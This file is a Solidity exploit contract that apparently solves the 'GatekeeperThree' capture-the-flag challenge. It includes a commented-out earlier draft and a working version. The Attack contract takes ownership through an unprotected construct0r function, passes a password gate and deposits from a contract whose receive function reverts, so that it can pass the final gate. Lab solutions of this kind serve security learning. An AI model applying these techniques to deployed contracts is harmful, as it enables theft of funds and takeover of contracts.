// SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import {GatekeeperThree, SimpleTrick} from "../src/GatekeeperThree.sol";

// contract Attack {

//     GatekeeperThree public gateKeeper;
//     SimpleTrick public simpleTrick;

//     constructor(address payable _gateKeeper) payable{
//         gateKeeper = GatekeeperThree(_gateKeeper);
//         gateKeeper.createTrick();
//         simpleTrick = gateKeeper.trick();
//     }
    
//     function attack (bytes32 password) public {

//         gateKeeper.construct0r();
//         require(gateKeeper.owner() == address(this));

//         gateKeeper.getAllowance(uint256(password));
//         require(gateKeeper.allowEntrance(), "allowEntrance isn't true!");

//         (bool success, ) = address(gateKeeper).call{value: 0.0011 ether}(""); // contract must have more than 0.001 ethers
//         require(success, "deposit failed");

//         gateKeeper.enter();

//     }
    
//     receive() external payable {
//         revert("no money for you");
//     }

//     fallback() external payable {
//         require(true == false); //This makes any .send() to your attack contract fail.
//         //.send() does not revert the parent function — it just returns false if the transfer failed.
//     }
// }



pragma solidity ^0.8.20;

interface IKeeper {
    function owner() external view returns (address);

    function entrant() external view returns (address);

    function allowEntrance() external view returns (bool);

    function trick() external view returns (address);

    function construct0r() external;

    function getAllowance(uint _password) external;

    function createTrick() external;

    function enter() external;
}

interface ITrick {
    function checkPassword(uint256 _password) external view returns (bool);
}


contract Attack {
    IKeeper public immutable keeper;
    address public trick;

    constructor(address _keeper) payable {
        keeper = IKeeper(_keeper);
        // Deploy SimpleTrick
        keeper.createTrick();
        trick = keeper.trick();
    }

    function attack(bytes32 _password) public {
        // Gate 1: Contract become owner, thanks to the lack of access control
        keeper.construct0r();
        require(keeper.owner() == address(this), "Contract isn't owner!");

        // Gate 2: Call getAllowance to get password
        keeper.getAllowance(uint256(_password));
        require(keeper.allowEntrance(), "allowEntrance isn't true!");

        // Gate 3: Deposit to keeper but revert on receive
        (bool success, ) = address(keeper).call{value: 0.0011 ether}("");
        require(success, "Deposit failed!");

        keeper.enter(); 
        require(keeper.entrant() == msg.sender, "Attack failed!");
    }

    receive() external payable {
        revert("no money for you");
    }
}